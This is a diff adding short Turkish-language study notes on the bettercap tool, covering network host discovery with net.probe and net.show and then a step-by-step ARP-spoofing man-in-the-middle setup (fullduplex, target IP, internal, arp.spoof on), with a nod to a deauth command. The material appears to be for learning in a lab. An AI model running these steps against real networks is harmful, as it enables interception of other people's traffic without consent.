@@ -1,0 +1,29 @@
+1) bettercap -iface eth0/wlan0 yazip hangi interfacede calisacaksak onu sevciyoruz
+	help yazarak komutlari nasil kullanacagimizi gorebiliriz.
+	help net.probe yazarak bu komutun nasil kullanilacagi hakkinda bilgi aliriz.
+
+2) net.probe on ==> bu komut netdiscover ile yaptigimiz hattaki kullanicilarin ip ve mac adreslerini almamiza yarar.
+	net.probe u calistirdiktan sonra net.recon isimli bir komutun da calismis oldugunu goruruz sebebi:
+	probe:incelemek-bulmak
+	net.probe aslinda bagli oldugumuz agdaki tum kullanicilarin ip adreslerini inceleyip durtuyor.
+	net.recon ise bu durtulen ip adreslerindeki sonuclari bana bir liste halinde gosteriyor.
+
+3) net.show komutu ile net.probe komutunun yaptigi islevi sadece daha guzel acik bir gorunumle gorebiliriz.
+
+----NOT: buraya kadar olan kisimda sadece netdiscover komutu ile yapabildiklerimizi daha guzel bir framework ile yapabildigimizi gorduk. simdi ortadaki adam olma zamani
+
+------ARP ATTACK-------
+
+1. net.probe sayesinde aldigimiz ip ile arp.spoof(arp sazanlama) calistiriyoruz
+	help arp.spoof ile nasil kullanildigini gorebiliriz.
+	arp.ban on DEAUTH SALDIRISI
+NOT: Bettercap icerisinde bir parametre nasil degisilir.
+mesela arp spoof baslamasi icin arp.spoof.fullduplex deafultunun true olmasi lazim bunu soyle degistirecegiz:
+2. set arp.spoof.fullduplex true
+3. set arp.spoof.targets 10.0.2.15(targets diyor istersek birkac hedef ekleyebilirdik)
+
+Bu asama ile saldiri yapmaya haziriz.ama eger gercek bir saldiri yapacaksan wifi kartin ile sunu da yaz.
+4. set arp.spoof.internal true
+
+4. arp.spoof on
+help yazip bettercap arayuzunden arp.spoof un runing oldugunu gorebiliriz.
